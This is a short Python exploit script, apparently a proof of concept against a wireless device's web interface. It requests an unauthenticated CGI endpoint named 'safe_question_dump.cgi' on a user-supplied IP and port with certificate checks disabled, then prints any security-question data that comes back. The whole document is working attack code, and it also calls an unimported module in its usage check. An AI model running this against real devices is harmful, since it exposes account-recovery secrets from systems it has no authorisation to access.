#!/usr/bin/env python

import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp(url):
    res = ''
    try:
        res = requests.get(url,verify=False,timeout=3)
        if "question0" in res.text:
            print("[+] successful ")
            print(res.text)
    except Exception as e:
        print(e)




if __name__ == '__main__':
    if len(sys.argv) != 3:
        print ('usage:')
        print ('python exp.py ip port')
        os._exit(0)


    ip=sys.argv[1]
    port=sys.argv[2]

    exp("http://" + ip + ":" +  port + "/app/safety_wireless/webs/images/safe_question_dump.cgi")

